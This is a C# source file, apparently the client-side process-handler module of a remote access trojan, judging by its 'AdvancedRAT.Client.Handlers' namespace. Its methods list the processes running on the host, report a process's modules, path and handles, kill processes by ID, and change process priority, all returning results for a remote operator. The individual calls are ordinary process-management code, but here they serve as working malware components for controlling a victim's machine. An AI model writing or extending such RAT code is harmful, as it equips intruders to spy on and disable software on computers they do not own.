using System;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Management;

namespace AdvancedRAT.Client.Handlers
{
    public class ProcessHandler
    {
        public async Task<object> GetProcessList()
        {
            try
            {
                var processes = new List<object>();
                
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        processes.Add(new
                        {
                            pid = proc.Id,
                            name = proc.ProcessName,
                            title = proc.MainWindowTitle,
                            memory = proc.WorkingSet64,
                            threads = proc.Threads.Count
                        });
                    }
                    catch { }
                }
                
                return new { success = true, processes };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> KillProcess(int pid)
        {
            try
            {
                var process = Process.GetProcessById(pid);
                process.Kill();
                
                return new { success = true, message = $"Process {pid} killed" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> GetProcessInfo(int pid)
        {
            try
            {
                var process = Process.GetProcessById(pid);
                
                var modules = new List<string>();
                try
                {
                    foreach (ProcessModule module in process.Modules)
                    {
                        modules.Add(module.ModuleName);
                    }
                }
                catch { }
                
                return new
                {
                    success = true,
                    info = new
                    {
                        pid = process.Id,
                        name = process.ProcessName,
                        path = process.MainModule?.FileName,
                        memory = process.WorkingSet64,
                        threads = process.Threads.Count,
                        handles = process.HandleCount,
                        startTime = process.StartTime.ToString(),
                        modules
                    }
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> SetPriority(int pid, string priority)
        {
            try
            {
                var process = Process.GetProcessById(pid);
                process.PriorityClass = priority switch
                {
                    "high" => ProcessPriorityClass.High,
                    "abovenormal" => ProcessPriorityClass.AboveNormal,
                    "normal" => ProcessPriorityClass.Normal,
                    "belownormal" => ProcessPriorityClass.BelowNormal,
                    "low" => ProcessPriorityClass.Idle,
                    _ => ProcessPriorityClass.Normal
                };
                
                return new { success = true, message = "Priority changed" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
